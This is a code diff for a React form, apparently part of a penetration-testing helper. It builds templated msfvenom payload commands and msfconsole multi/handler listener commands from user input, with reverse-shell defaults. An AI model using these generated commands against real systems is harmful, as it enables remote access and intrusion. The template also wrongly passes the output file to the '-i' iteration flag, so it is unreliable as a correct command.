@@ -1,5 +1,5 @@
 import React from 'react';
-import { Input, Typography, Row, Divider, Select, Form, Col } from 'antd';
+import { Input, Typography, Row, Divider, Select, Form, Col, Collapse } from 'antd';
 import PersistedState from 'use-persisted-state';
 import Clipboard from 'react-clipboard.js';
 import QueueAnim from 'rc-queue-anim';
@@ -12,9 +12,12 @@ const MSFBuilder = () => {
 
 	// Antd stuff
 	const { Option } = Select;
+	const { Panel } = Collapse;
 
 	let payloads = require('../../assets/data/Payloads.json');
 	let encoder = require('../../assets/data/Encoder.json');
+	let platform = require('../../assets/data/Platform.json');
+	let format = require('../../assets/data/Format.json');
 
 	const [ values, setValues ] = msfVenomBuilder({
 		Payload: '',
@@ -26,7 +29,6 @@ const MSFBuilder = () => {
 		Arch: '',
 		NOP: '',
 		BadCharacters: '',
-		Additional: '',
 		Format: '',
 		Outfile: ''
 	});
@@ -128,14 +130,99 @@ const MSFBuilder = () => {
 						<Input
 							value={values.BadCharacters}
 							onChange={handleChange('BadCharacters')}
-							maxLength={2}
 							placeholder='\x00\x0a\x0d'
 						/>
 					</Form.Item>
 				</Form>
-				<Paragraph>
-					<pre>{JSON.stringify(values, undefined, 2)}</pre>
-				</Paragraph>
+				<Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
+					<Col span={12}>
+						<Form.Item name='platform' label='Platform' rules={[ { message: 'Missing area' } ]}>
+							<Select
+								showSearch
+								options={platform}
+								value={values.Platform}
+								onChange={handleChangeSelect('Platform')}
+								placeholder='Windows'
+								filterOption={(inputValue, option) =>
+									option.value.toUpperCase().indexOf(inputValue.toUpperCase()) !== -1}
+							>
+								{platform.map((data, key) => {
+									return <Option key={key}>{data.value}</Option>;
+								})}
+							</Select>
+						</Form.Item>
+					</Col>
+					<Col span={12}>
+						<Form.Item name='architecture' label='Architecture' rules={[ { message: 'Missing area' } ]}>
+							<Select
+								showSearch
+								value={values.Arch}
+								onChange={handleChangeSelect('Arch')}
+								placeholder='x86'
+							>
+								<Option key={'x64'}>x64</Option>
+								<Option key={'x86'}>x86</Option>
+							</Select>
+						</Form.Item>
+					</Col>
+				</Row>
+				<Form.Item name='nop' label='Nop&#39;s' rules={[ { message: 'Missing area' } ]}>
+					<Input value={values.NOP} onChange={handleChange('NOP')} maxLength={5} placeholder='200' />
+				</Form.Item>
+				<Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
+					<Col span={12}>
+						<Form.Item name='format' label='Format' rules={[ { message: 'Missing area' } ]}>
+							<Select
+								showSearch
+								options={format}
+								value={values.Format}
+								onChange={handleChangeSelect('Format')}
+								placeholder='powershell'
+								filterOption={(inputValue, option) =>
+									option.value.toUpperCase().indexOf(inputValue.toUpperCase()) !== -1}
+							>
+								{format.map((data, key) => {
+									return <Option key={key}>{data.value}</Option>;
+								})}
+							</Select>
+						</Form.Item>
+					</Col>
+					<Col span={12}>
+						<Form.Item name='outfile' label='Output File' rules={[ { message: 'Missing area' } ]}>
+							<Input
+								value={values.Outfile}
+								onChange={handleChange('Outfile')}
+								placeholder='reverse_shell'
+							/>
+						</Form.Item>
+					</Col>
+				</Row>
+				<Collapse defaultActiveKey={[ '1' ]} ghost>
+					<Panel header='MSF Venom Command' key='1'>
+						<Paragraph>
+							<pre
+							>{`msfvenom -p ${values.Payload} LHOST=${values.LHOST} LPORT=${values.LPORT} --platform ${values.Platform} -a ${values.Arch} -n ${values.NOP} -e ${values.Encoder} -b "${values.BadCharacters}" -f ${values.Format} -i ${values.Outfile}`}</pre>
+						</Paragraph>
+					</Panel>
+					<Panel header='Launch Console & Load Handler' key='2'>
+						<Paragraph>
+							<pre>
+								{`msfconsole -x "use exploit/multi/handler; set PAYLOAD ${values.Payload}; set LHOST ${values.LHOST}; set LPORT ${values.LPORT}; run"`}
+							</pre>
+						</Paragraph>
+					</Panel>
+					<Panel header='Load Handler Only' key='3'>
+						<Paragraph>
+							<pre>
+								{`use exploit/multi/handler
+set PAYLOAD ${values.Payload}
+set LHOST ${values.LHOST}
+set LPORT ${values.LPORT}
+run`}
+							</pre>
+						</Paragraph>
+					</Panel>
+				</Collapse>
 			</div>
 		</QueueAnim>
 	);
